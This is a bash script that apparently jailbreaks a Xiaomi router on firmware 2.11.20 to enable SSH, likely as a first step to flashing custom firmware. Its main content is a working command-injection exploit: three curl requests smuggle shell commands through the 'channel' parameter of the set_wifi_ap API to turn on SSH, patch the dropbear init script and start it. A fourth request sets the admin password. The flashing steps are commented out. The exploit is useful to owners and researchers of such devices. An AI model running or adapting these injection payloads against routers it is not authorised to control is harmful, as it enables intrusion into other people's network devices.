#!/bin/bash
if [ "$#" -ne 2 ]; then
  echo -e "Usage: ./flasher ROUTER_IP STOK\n";
  echo "Prerequisites: ";
  echo "  Must be on firmware 2.11.20 Chinese version";
  echo "  Must have completed initial router setup with password set to \"password\"";
  exit 0;
fi

echo -e  "\e[1m\e[32m==>\e[0m Gaining SSH Access...";
# Step 1
echo -ne "  \e[1m\e[34m->\e[0m Step 1/4... ";
RESULT=$(curl -s "http://$1/cgi-bin/luci/;stok=$2/api/xqnetwork/set_wifi_ap?ssid=Xiaomi&encryption=NONE&enctype=NONE&channel=1%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit");
if [ "$RESULT" != "{\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}" ]; then
  echo "ERR!"
  echo -e "  \e[1m\e[34m->\e[0m Expected: {\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}";
  echo -e "  \e[1m\e[34m->\e[0m Got:      $RESULT";
  exit 1;
fi
echo "OK";

# Step 2
echo -ne "  \e[1m\e[34m->\e[0m Step 2/4... ";
RESULT=$(curl -s "http://$1/cgi-bin/luci/;stok=$2/api/xqnetwork/set_wifi_ap?ssid=Xiaomi&encryption=NONE&enctype=NONE&channel=1%3Bsed%20%2Di%20%22%3Ax%3AN%3As%2Fif%20%5C%5B%2E%2A%5C%3B%20then%5Cn%2E%2Areturn%200%5Cn%2E%2Afi%2F%23tb%2F%3Bb%20x%22%20%2Fetc%2Finit.d%2Fdropbear");
if [ "$RESULT" != "{\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}" ]; then
  echo "ERR!"
  echo -e "  \e[1m\e[34m->\e[0m Expected: {\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}";
  echo -e "  \e[1m\e[34m->\e[0m Got:      $RESULT";
  exit 1;
fi
echo "OK";

# Step 3
echo -ne "  \e[1m\e[34m->\e[0m Step 3/4... ";
RESULT=$(curl -s "http://$1/cgi-bin/luci/;stok=$2/api/xqnetwork/set_wifi_ap?ssid=Xiaomi&encryption=NONE&enctype=NONE&channel=1%3B%2Fetc%2Finit.d%2Fdropbear%20start")
if [ "$RESULT" != "{\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}" ]; then
  echo "ERR!"
  echo -e "  \e[1m\e[34m->\e[0m Expected: {\"msg\":\"未能连接到指定WiFi(Probe timeout)\",\"code\":1616}";
  echo -e "  \e[1m\e[34m->\e[0m Got:      $RESULT";
  exit 1;
fi
echo "OK";

# Step 4
echo -ne "  \e[1m\e[34m->\e[0m Step 4/4... ";
RESULT=$(curl -s "http://$1/cgi-bin/luci/;stok=$2/api/xqsystem/set_name_password?oldPwd=password&newPwd=password")
if [ "$RESULT" != "{\"code\":0}" ]; then
  echo "ERR!"
  echo -e "  \e[1m\e[34m->\e[0m Expected: {\"code\":0}";
  echo -e "  \e[1m\e[34m->\e[0m Got:      $RESULT";
  exit 1;
fi
echo "OK";

#echo -e  "\e[1m\e[32m==>\e[0m Flashing Firmware...";

#echo -e  "\e[1m\e[32m==>\e[0m Flashing Complete!";
